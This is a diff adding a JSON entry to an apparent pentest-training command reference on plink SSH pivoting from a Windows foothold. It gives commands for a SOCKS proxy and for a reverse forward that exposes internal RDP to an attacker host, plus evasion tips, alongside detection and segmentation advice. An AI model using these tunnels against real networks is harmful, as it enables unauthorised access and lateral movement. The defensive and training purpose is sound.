@@ -1,0 +1,93 @@
+{
+  "id": "plink-dynamic",
+  "name": "Plink - Dynamic Port Forward (Windows)",
+  "command": "plink -ssh -D <socks_port> <user>@<pivot>",
+  "description": "The PuTTY command-line SSH client for Windows attack hosts, used to open a SOCKS proxy (-D) from a Windows foothold. Pair it with Proxifier to force applications like mstsc.exe through the tunnel to internal targets.",
+  "platform": "windows",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "plink"
+  ],
+  "tags": [
+    "plink",
+    "ssh",
+    "socks",
+    "windows",
+    "pivoting"
+  ],
+  "category": "Pivoting & Tunneling",
+  "subcategory": "SSH Tunneling",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 12: Pivoting, Tunneling, and Port Forwarding",
+  "examples": [
+    {
+      "label": "Dynamic SOCKS (-D)",
+      "command": "plink -ssh -D 9050 ubuntu@10.129.15.50"
+    },
+    {
+      "label": "OSCP Ch18 \u2014 plink remote port forward from Windows to expose internal RDP via Kali",
+      "command": "C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>"
+    },
+    {
+      "label": "OSCP Ch18 \u2014 auto-accept host key on first connection (non-interactive)",
+      "command": "cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>"
+    }
+  ],
+  "notes": "Configure Proxifier with SOCKS4 127.0.0.1:9050 and a rule sending mstsc.exe to the internal target. Also covered in: OSCP PEN-200 Chapter 18 (Port Redirection and SSH Tunneling). OSCP Ch18: plink's main use case is -R (remote port forward) from a Windows pivot back to Kali. The 'echo y |' trick pipes 'y' to auto-accept the server's host key on first connection (non-interactive; no ~/.ssh/known_hosts on Windows). Plink binary can be copied from Kali (/usr/share/windows-resources/binaries/plink.exe) and transferred to the Windows target. Pair with xfreerdp on Kali targeting 127.0.0.1:<kali_port>.",
+  "references": [
+    {
+      "title": "HTB Academy - Pivoting, Tunneling, and Port Forwarding",
+      "url": "https://academy.hackthebox.com/module/details/158"
+    },
+    {
+      "title": "PuTTY",
+      "url": "https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html"
+    },
+    {
+      "title": "OffSec PEN-200 - Port Redirection and SSH Tunneling",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "proxychains-run",
+      "note": "Drive tools through the Windows SOCKS proxy.",
+      "rel": "alternative"
+    },
+    {
+      "id": "rdp-enum",
+      "rel": "next",
+      "note": "Use Proxifier to route mstsc.exe through the plink SOCKS tunnel to the RDP target."
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1572"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "plink.exe (PuTTY CLI) establishes SSH dynamic/port forwarding from a Windows pivot where a native SSH client is absent.",
+    "prerequisites": "plink on a Windows pivot and SSH access to a host that reaches the target network.",
+    "impact": "SOCKS/port-forward pivoting from Windows into internal networks.",
+    "detection": "[MITRE T1090.001] A compromised host relaying traffic between segments it shouldn't bridge; an unexpected listening port (SOCKS/forwarder) on the pivot; the pivot initiating connections to hosts/ports it never normally contacts; lateral flows that appear to originate from the pivot (NetFlow/east-west monitoring).",
+    "artifacts": "plink.exe with -D/-R in process logs; an SSH session from the Windows pivot; a SOCKS listener.",
+    "prevention": "[MITRE T1090.001 M1030 Network Segmentation] strict east-west firewall rules so one foothold can't reach other segments; egress filtering; IDS/IPS + NetFlow analysis for proxy patterns and long-lived flows; alert on unexpected listeners on servers.",
+    "evasion": "Tunnel over an allowed protocol/port (443) and encrypt the channel so the relay blends with normal traffic; keep the listener on a common-looking port.",
+    "sources": [
+      "HTB M12",
+      "MITRE T1572"
+    ],
+    "misconfiguration": "The network lacks proper segmentation \u2014 a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
+    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy \u2014 direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
+    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering \u2014 block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring \u2014 detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection \u2014 detect reverse tunnels in HTTPS streams"
+  }
+}
